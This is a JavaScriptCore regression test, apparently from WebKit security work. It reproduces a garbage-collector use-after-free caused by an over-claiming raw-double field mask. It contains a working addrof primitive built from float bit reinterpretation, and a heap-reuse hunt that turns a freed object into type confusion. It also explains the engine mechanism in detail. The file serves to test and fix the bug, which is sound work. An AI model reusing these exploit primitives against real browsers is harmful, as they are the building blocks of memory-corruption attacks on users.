//@ runDefault("--useDoubleFieldRepresentation=1", "--useRawDoubleFieldStorage=1")
//
// Regression test. Reduction, measurement log and the full mechanism write-up live in
// JS-data analysis/prompt/box2d/repro/bugs/02b-repro-defineproperty-attrchange-uaf.js and the fix design in that directory's fixes/.
//
// REPRO for bug 02b — the GC half of bug 02. A live JSObject whose ONLY reference is a slot the raw-double
// mask over-claims is not traced, is swept, and its storage is handed to a later allocation while the script
// still holds the reference. Use-after-free, reachable from the addrof in bug 02.
//
// This is a separate file from 02 on purpose: the liveness oracle is an address hunt, so it is sensitive to
// the allocation sequence and must run in a pristine one. Adding even one extra `print` before the hunt
// moved the reuse outside the 200000-allocation budget (verified while writing this).
//
// Run (WebKit-security/OpenSource):
//   ./Tools/Scripts/run-jsc --release analysis/prompt/box2d/repro/bugs/02b-repro-defineproperty-attrchange-uaf.js
//
//   --useRawDoubleFieldStorage=1  (the staged DEFAULT) -> FAIL, deterministic
//   --useRawDoubleFieldStorage=0                       -> "PASS" (addrof is unavailable, nothing to hunt)
//   pre-patch build (WebKitBuild-without/Release)      -> "PASS"
//
// OBSERVED, 5 consecutive runs, byte-identical every time:
//
//   victim's storage reused by a fresh object: true at iteration 3350
//   holder.a STILL points at that address    : true
//   the fresh object there is live and distinct: true
//
// The three lines are the three halves of a use-after-free:
//   (1) the memory was reclaimed and reallocated,
//   (2) the script's reference was never dropped -- holder.a's raw word is unchanged across the collections,
//   (3) what lives there now is a different, live object -- i.e. holder.a is a type confusion.
//
// CONTROL, same file with `holder` using property "b" instead of "a" (its attribute-change transition was
// never poisoned, so the mask does not claim it), feature still ON:
//
//   holder claims raw: false
//   address reused by a NEW object = false        <- 200000 allocations, never reused
//
// so the collection is caused by the mask claim and not by the churn.
//
// MECHANISM
//   Bug 02 leaves `holder`'s slot holding a genuine JSObject* while holder->structure() claims the offset is
//   a raw double. GC tracing consults the same mask:
//
//       JSObject.cpp appendNonRawDoubleValues:
//           if (!structure->isRawDoubleOffset(offset)) [[likely]]
//               continue;                          // ... otherwise the slot is SKIPPED
//
//   reached from JSFinalObject::visitChildrenImpl and markAuxiliaryAndVisitOutOfLineProperties, both gated
//   only on structure->hasRawDoubleFields(). So the collector never follows the pointer, the victim has no
//   other referent, and it is swept.
//
//   Note this is the OVER-claim direction, which the patch's own documentation
//   (structure-raw-double-offset-mask.js, Structure.h m_rawDoubleMask) singles out:
//       the mask may UNDER-claim (says boxed, is boxed)   -- safe
//       the mask must never OVER-claim (says raw, is boxed) -- this is the crash
//   Bug 02 is exactly how an over-claim gets created from script.
//
// HOW THE ORACLE WORKS, and why it is trustworthy
//   addrof() is bug 02 itself: it returns a cell's address as a Number. If a LATER, freshly allocated object
//   reports the SAME address, the victim's cell must have been freed and its storage reused -- a live cell
//   cannot be handed to a new allocation. The hunt allocates same-shape objects until it sees the address
//   come back.
//
//   Corrected from an earlier attempt: a FinalizationRegistry probe reported 0 premature finalizations, but
//   its own positive control (3000 objects with no reference at all) also reported 0, so
//   FinalizationRegistry does not work as a liveness instrument in the jsc shell. That run proved nothing
//   and was discarded. This oracle has a working negative control, above.
//
// FIX
//   Fixing bug 02 removes this: no over-claim, nothing for the collector to skip. See the FIX SHAPE section
//   of 02-repro-defineproperty-attrchange-addrof.js. Independently, bug 05 shows the same GC skip firing
//   from a completely different route, so the collector's use of the ungated isRawDoubleOffset() is worth
//   revisiting on its own.

function mk() { var o = {}; o.a = 1; return o; }

// Poison the {a} shape's attribute-change transition so it claims offset 0 is a raw double.
var prim = mk();
Object.defineProperty(prim, "a", { value: 1.5, enumerable: false });

var f64 = new Float64Array(1), u32 = new Uint32Array(f64.buffer);
function bitsOf(d) { f64[0] = d; return (u32[1] >>> 0) * 4294967296 + (u32[0] >>> 0); }

function addrof(x) {
    var o = mk();
    Object.defineProperty(o, "a", { value: x, enumerable: false });
    var d = o.a;
    if (typeof d !== "number")
        throw new Error("addrof unavailable");
    return bitsOf(d);
}

var holder = mk();
var target = -1;
var addrofWorks = true;
try {
    (function () {
        var victim = { tag: "secret", pad1: 1, pad2: 2 };
        Object.defineProperty(holder, "a", { value: victim, enumerable: false });   // ONLY reference to victim
        target = addrof(victim);
    })();
} catch (e) {
    // The slot is not over-claimed, so bug 02 does not apply and there is nothing to collect early.
    addrofWorks = false;
    print("addrof unavailable -- the slot is not over-claimed, so there is nothing to hunt");
}

if (addrofWorks) {
    for (var r = 0; r < 5; ++r) {
        for (var i = 0; i < 200; ++i) { var junk = []; for (var j = 0; j < 400; ++j) junk.push({ a: j, b: j + 0.5 }); }
        $vm.gc();
    }

    var reused = -1, keep = [];
    for (var i = 0; i < 200000 && reused < 0; ++i) {
        var n = { tag: "new", pad1: 1, pad2: 2 };
        keep.push(n);
        if (addrof(n) === target) reused = i;
    }

    var stillReferenced = bitsOf(holder.a) === target;
    var occupantIsLive = reused >= 0 && keep[reused].tag === "new" && keep[reused].pad1 === 1;

    print("victim's storage reused by a fresh object  : " + (reused >= 0) + (reused >= 0 ? (" at iteration " + reused) : ""));
    print("holder.a STILL points at that address      : " + stillReferenced);
    print("the fresh object there is live and distinct: " + occupantIsLive);

    if (reused >= 0 && stillReferenced && occupantIsLive)
        throw new Error("use-after-free: holder.a references memory now owned by a different live object");
}

print("PASS");
